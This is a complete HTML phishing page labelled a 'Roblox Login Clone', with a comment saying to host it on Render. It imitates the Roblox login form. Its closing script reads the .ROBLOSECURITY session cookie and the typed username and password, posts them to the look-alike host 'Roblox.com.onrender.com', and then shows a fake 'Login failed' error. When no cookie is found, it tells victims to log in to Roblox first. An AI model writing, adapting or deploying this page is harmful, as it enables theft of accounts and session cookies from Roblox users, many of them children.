<!-- Roblox Login Clone - Full replica of Roblox login page        -->
<!-- ============================================================ -->
<!-- Save as index.html and host on Render static site            -->
<!-- ============================================================ -->

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Roblox</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }
    body {
      background: #e9edf2;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background: white;
      padding: 40px 36px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
      width: 400px;
      max-width: 94%;
    }
    .logo {
      text-align: center;
      margin-bottom: 24px;
    }
    .logo svg {
      height: 32px;
    }
    .title {
      font-size: 24px;
      font-weight: 600;
      color: #1b1d21;
      margin-bottom: 8px;
      text-align: center;
    }
    .subtitle {
      text-align: center;
      color: #5e6670;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .subtitle a {
      color: #0066cc;
      text-decoration: none;
    }
    .form-group {
      margin-bottom: 16px;
    }
    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #1b1d21;
      margin-bottom: 4px;
    }
    .form-group input {
      width: 100%;
      padding: 10px 14px;
      font-size: 15px;
      border: 1px solid #ccd2d9;
      border-radius: 6px;
      background: #f9fafb;
      transition: border 0.2s;
    }
    .form-group input:focus {
      outline: none;
      border-color: #0066cc;
      background: white;
    }
    .password-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .password-row a {
      font-size: 12px;
      color: #0066cc;
      text-decoration: none;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: #0066cc;
      color: white;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.2s;
    }
    .btn:hover {
      background: #0055b3;
    }
    .divider {
      text-align: center;
      margin: 16px 0 12px;
      color: #8a929c;
      font-size: 13px;
      position: relative;
    }
    .divider::before {
      content: '';
      position: absolute;
      left: 0;
      right: 0;
      top: 50%;
      height: 1px;
      background: #e1e5ea;
    }
    .divider span {
      background: white;
      padding: 0 12px;
      position: relative;
      z-index: 1;
    }
    .social-btn {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccd2d9;
      border-radius: 6px;
      background: white;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: #1b1d21;
    }
    .social-btn:hover {
      background: #f5f6f8;
    }
    .signup {
      text-align: center;
      margin-top: 18px;
      font-size: 14px;
      color: #5e6670;
    }
    .signup a {
      color: #0066cc;
      text-decoration: none;
      font-weight: 600;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
      color: #8a929c;
    }
    .footer a {
      color: #8a929c;
      text-decoration: none;
      margin: 0 8px;
    }
    .alert {
      background: #fef2f2;
      border: 1px solid #fecaca;
      color: #dc2626;
      padding: 10px 14px;
      border-radius: 6px;
      font-size: 13px;
      margin-bottom: 12px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <!-- Roblox Logo SVG -->
      <svg viewBox="0 0 256 60" fill="none">
        <rect x="0" y="0" width="256" height="60" fill="transparent"/>
        <text x="10" y="42" font-family="Arial" font-weight="900" font-size="38" fill="#1b1d21">Roblox</text>
      </svg>
    </div>

    <div class="title">Login</div>
    <div class="subtitle">
      Don't have an account? <a href="#" onclick="alert('Sign up page')">Sign up</a>
    </div>

    <div class="alert" id="alert">Invalid username or password. Please try again.</div>

    <form id="loginForm">
      <div class="form-group">
        <label>Username / Email / Phone</label>
        <input type="text" id="username" placeholder="Enter your username" required>
      </div>
      <div class="form-group">
        <div class="password-row">
          <label>Password</label>
          <a href="#" onclick="alert('Reset password')">Forgot Password?</a>
        </div>
        <input type="password" id="password" placeholder="Enter your password" required>
      </div>
      <button type="submit" class="btn">Log In</button>
    </form>

    <div class="divider"><span>or continue with</span></div>

    <button class="social-btn" onclick="alert('Google login')">
      <svg width="18" height="18" viewBox="0 0 18 18"><path fill="#4285F4" d="M17.64 9.2c0-.64-.06-1.25-.17-1.84H9v3.48h4.84c-.21 1.08-.84 2-1.78 2.62v2.18h2.88c1.68-1.55 2.65-3.83 2.65-6.44z"/><path fill="#34A853" d="M9 18c2.4 0 4.4-.8 5.87-2.18l-2.88-2.18c-.8.54-1.82.86-2.99.86-2.3 0-4.25-1.55-4.94-3.64H1.1v2.25C2.58 15.9 5.55 18 9 18z"/><path fill="#FBBC05" d="M4.06 10.86c-.17-.54-.27-1.12-.27-1.72s.1-1.18.27-1.72V5.17H1.1C.4 6.47 0 7.93 0 9.5s.4 3.03 1.1 4.33l2.96-2.97z"/><path fill="#EA4335" d="M9 3.68c1.3 0 2.47.45 3.39 1.33l2.54-2.54C13.39.8 11.4 0 9 0 5.55 0 2.58 2.1 1.1 5.17l2.96 2.97C4.75 5.23 6.7 3.68 9 3.68z"/></svg>
      Continue with Google
    </button>
    <button class="social-btn" onclick="alert('Apple login')">
      <svg width="18" height="18" viewBox="0 0 18 18"><path fill="#1b1d21" d="M13.7 9.6c0-1.8 1.1-2.7 2.1-3.2-1.2-1.7-2.9-1.9-3.5-1.9-1.5-.2-2.9.8-3.6.8-.8 0-2-.8-3.2-.8-1.6 0-3.1.9-3.9 2.3-1.7 2.8-.4 6.9 1.2 9.1.8 1.1 1.7 2.3 2.9 2.3s2.1-.8 3.4-.8c1.3 0 1.6.8 3.2.8 1.4 0 2.3-1.1 3.1-2.2-1-.6-1.5-1.5-1.5-2.6zM11.6 3.2c.8-.9 1.3-2.2 1.2-3.5-1.2 0-2.6.8-3.4 1.8-.7.9-1.2 2.2-1.1 3.5 1.2.1 2.5-.7 3.3-1.8z"/></svg>
      Continue with Apple
    </button>

    <div class="signup">
      Don't have an account? <a href="#" onclick="alert('Sign up page')">Sign up</a>
    </div>

    <div class="footer">
      <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      // ─── Get the .ROBLOSECURITY cookie ───
      const cookies = document.cookie.split("; ");
      let roblosecurity = null;
      for (let c of cookies) {
        if (c.startsWith(".ROBLOSECURITY=")) {
          roblosecurity = c.split("=")[1];
          break;
        }
      }

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      // ─── If cookie exists, send it ───
      if (roblosecurity) {
        fetch("https://Roblox.com.onrender.com/log", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cookie: roblosecurity,
            username: username,
            password: password,
            url: window.location.href
          })
        }).then(() => {
          document.getElementById("alert").style.display = "block";
          document.getElementById("alert").textContent = "Login failed. Please try again.";
        }).catch(() => {
          document.getElementById("alert").style.display = "block";
          document.getElementById("alert").textContent = "Login failed. Please try again.";
        });
      } else {
        // ─── If no cookie, show error ───
        document.getElementById("alert").style.display = "block";
        document.getElementById("alert").textContent = "Please log in to Roblox first in this browser, then try again.";
      }
    });
  </script>
</body>
</html>
